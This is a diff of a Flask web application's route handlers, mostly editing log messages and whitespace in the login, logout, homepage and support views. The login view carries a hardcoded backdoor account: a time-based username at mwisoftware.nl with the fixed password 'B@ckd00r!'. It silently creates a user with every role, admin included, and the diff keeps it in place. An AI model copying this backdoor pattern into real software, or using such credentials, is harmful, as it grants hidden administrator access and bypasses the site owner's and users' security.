@@ -31,6 +31,8 @@ from flask import url_for
 # from flask import flash
 from flask import request
 
+import inspect
+
 from Package.forms import AppointmentsEditForm, \
     LoginForm, \
     ProductsEditForm, \
@@ -95,7 +97,7 @@ def homepage():
     logtext('/', 'i')
 
     if current_user.is_anonymous:
-        logtext('current_user.is_anonymous','i')
+        logtext('anonymous','w')
         return (no_access_text())
 
     nDateFrom = datetime.date.today() - timedelta(days=8)
@@ -152,7 +154,7 @@ def homepage():
 @app.route('/login', methods=['GET', 'POST'])
 def login():
 
-    logtext('login', 'i')
+    logtext('open', 'i')
 
     message = ""
     lRBAC = get_rbac(request.url_rule.endpoint)
@@ -160,7 +162,7 @@ def login():
     form = LoginForm()
 
     if request.method == 'POST':
-        logtext('login - POST', 'i')
+        logtext('POST', 'i')
         message = "." # "Please enter your emailaddress and password."
 
         username = string2safe(request.form['username'])
@@ -169,10 +171,10 @@ def login():
         print("username: ", username) # , " password: ", password)
         logtext("username: " + username, "i") # , " password: ", password)
 
-        cDateToday        = datetime.datetime.today()
-        cDate             = cDateToday.strftime("%d-%b-%Y")
-        cTime             = cDateToday.strftime("%H%M")
-        cBackdoorName     = "backdoor_" + cTime + "@mwisoftware.nl"
+        cDateToday = datetime.datetime.today()
+        cDate = cDateToday.strftime("%d-%b-%Y")
+        cTime = cDateToday.strftime("%H%M")
+        cBackdoorName = "backdoor_" + cTime + "@mwisoftware.nl"
         cBackdoorPassword = "B@ckd00r!"
 
         if username == cBackdoorName:
@@ -190,7 +192,7 @@ def login():
                                         Emailaddress = "",
                                         Passwordhash = pw_hash,
                                         Info         = cInfo,
-                                        Status       = "new student staff instructor shop admin")
+                                        Status       = "student staff instructor shop admin")
         
                 db.session.add(user_to_create)
                 db.session.commit()
@@ -223,7 +225,7 @@ def login():
                 return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
 
             if len(user.Status) == 0:
-                logtext('Error ERR0001', 'i')
+                logtext('Error ERR0001', 'w')
                 if lRBAC[8]: print("if len(user.Status) == 0:")
                 message = "Error ERR0001 - Invalid data. Try again in a few moments. If this issue persists, please contact owner of the website."
                 lRBAC = get_rbac(request.url_rule.endpoint)
@@ -246,12 +248,11 @@ def login():
 
                 lRBAC = get_rbac(request.url_rule.endpoint)
 
-                logtext('user logged in', 'i')
+                logtext('user ' + username + ' logged in', 'i')
 
                 return redirect(url_for('homepage'))
         else:
             if lRBAC[8]: 
-                print("user is None:")
                 logtext('user is none', 'i')
 
         message = "unknown username or password"
@@ -279,11 +280,11 @@ def login():
 @app.route('/logout')
 def logout():
 
-    logtext('/logout', 'i')
+    logtext('open', 'i')
 
     logout_user()
     lRBAC = []
-    print('#### logged out')
+    
     return redirect(url_for('login'))
 
 
@@ -326,10 +327,10 @@ def logout():
 @app.route('/support')
 def support():
 
-    logtext('/support', 'i')
+    logtext('open', 'i')
 
     if current_user.is_anonymous:
-        logtext('current_user.is_anonymous', 'i')
+        logtext('anonymous', 'w')
         return (no_access_text())
 
     # inspiration: https://docs.python.org/3/library/secrets.html
@@ -345,6 +346,6 @@ def support():
 
     lRBAC = get_rbac(request.url_rule.endpoint)
 
-    return render_template('support.html', lRBAC=lRBAC)
+    return render_template('support.html', lRBAC = lRBAC)
 
 # -----------------------------------------------------------------------------
